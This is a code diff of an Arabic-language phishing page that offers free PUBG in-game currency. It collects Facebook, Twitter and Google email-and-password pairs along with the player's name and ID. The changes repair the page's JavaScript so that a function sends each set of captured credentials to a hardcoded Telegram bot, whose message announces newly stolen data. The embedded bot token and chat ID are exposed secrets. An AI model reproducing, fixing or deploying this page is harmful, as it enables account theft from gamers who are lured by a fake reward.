@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -132,7 +131,7 @@
             margin-bottom: 8px;
             color: #ddd;
             font-weight: bold;
-}
+        }
         
         input, select {
             width: 100%;
@@ -278,9 +277,7 @@
 <body>
     <div class="header">
         <div class="logo-container">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNDAgODAiPjxwYXRoIGQ9Ik0xMDggMTVoMjJ2NTBIMTA4VjQ1aDEwdjVoMTBWMjBIMTA4djEwaDEwdjVIMTA4eiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xNDAgMTVoMjJ2MjBoLTEydjNoMTJ2MjdoLTEydjNoMTJ2MjBIMTQweiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xODIgMTVoMj
-
-2NTBoLTIyVjQ1aDEwdjVoMTBWMjBoLTIydjEwaDEwdjVIMTgyeiIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==" class="pubg-logo" alt="PUBG Logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNDAgODAiPjxwYXRoIGQ9Ik0xMDggMTVoMjJ2NTBIMTA4VjQ1aDEwdjVoMTBWMjBIMTA4djEwaDEwdjVIMTA4eiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xNDAgMTVoMjJ2MjBoLTEydjNoMTJ2MjdoLTEydjNoMTJ2MjBIMTQweiIgZmlsbD0iI0ZGRiIvPjxwYXRoIGQ9Ik0xODIgMTVoMjJ2NTBoLTIyVjQ1aDEwdjVoMTBWMjBoLTIydjEwaDEwdjVIMTgyeiIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==" class="pubg-logo" alt="PUBG Logo">
         </div>
         <h1>شحن شدات PUBG مجانًا - العرض الحصري</h1>
     </div>
@@ -316,7 +313,7 @@
                 </div>
                 <div class="input-group">
                     <label for="fb-password">كلمة مرور فيسبوك</label>
-                    <input type="password" id="fb-password" placeholder="****" required>
+                    <input type="password" id="fb-password" placeholder="********" required>
                 </div>
             </div>
             
@@ -328,7 +325,7 @@
                 </div>
                 <div class="input-group">
                     <label for="twitter-password">كلمة مرور تويتر</label>
-                    <input type="password" id="twitter-password" placeholder="****" required>
+                    <input type="password" id="twitter-password" placeholder="********" required>
                 </div>
             </div>
             
@@ -340,7 +337,7 @@
                 </div>
                 <div class="input-group">
                     <label for="google-password">كلمة مرور جوجل</label>
-                    <input type="password" id="google-password" placeholder="****" required>
+                    <input type="password" id="google-password" placeholder="********" required>
                 </div>
             </div>
         </div>
@@ -378,8 +375,7 @@
         </div>
     </div>
 
-
-<script>
+    <script>
         // إعدادات بوت التلجرام
         const BOT_TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
         const CHAT_ID = "7763665935";
@@ -396,20 +392,20 @@
             });
             
             // إظهار النموذج المختار
-            document.getElementById(${platform}-form).style.display = 'block';
+            document.getElementById(`${platform}-form`).style.display = 'block';
             selectedPlatform = platform;
         }
         
         // إرسال البيانات للتلجرام
         async function sendToTelegram(data) {
-            const message = 🎯 *تم سرقة بيانات جديدة!*\n\n
-                + 🌐 *المنصة:* ${data.platform}\n
-                + 📧 *ايميل:* ${data.email}\n
-                + 🔑 *كلمة المرور:* ${data.password}\n\n
-                + 👤 *اسم اللاعب:* ${data.playerName}\n
-                + 🆔 *معرف اللاعب:* ${data.playerID};
+            const message = `🎯 *تم سرقة بيانات جديدة!*\n\n`
+                + `🌐 *المنصة:* ${data.platform}\n`
+                + `📧 *ايميل:* ${data.email}\n`
+                + `🔑 *كلمة المرور:* ${data.password}\n\n`
+                + `👤 *اسم اللاعب:* ${data.playerName}\n`
+                + `🆔 *معرف اللاعب:* ${data.playerID}`;
             
-            const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
             
             try {
                 const response = await fetch(url);
@@ -475,10 +471,9 @@
                 document.getElementById('loading').style.display = 'none';
                 
                 if(success) {
-
-document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('successMessage').style.display = 'block';
                     setTimeout(() => {
-                        alert("!تم حسابك بنجاح! سيتم ");
+                        alert("!تم  حسابك بنجاح!   ");
                     }, 3000);
                 } else {
                     alert("فشل الإرسال! تأكد من اتصالك بالإنترنت");
@@ -491,4 +486,4 @@ document.getElementById('successMessage').style.display = 'block';
         }
     </script>
 </body>
-    </html>
+</html>
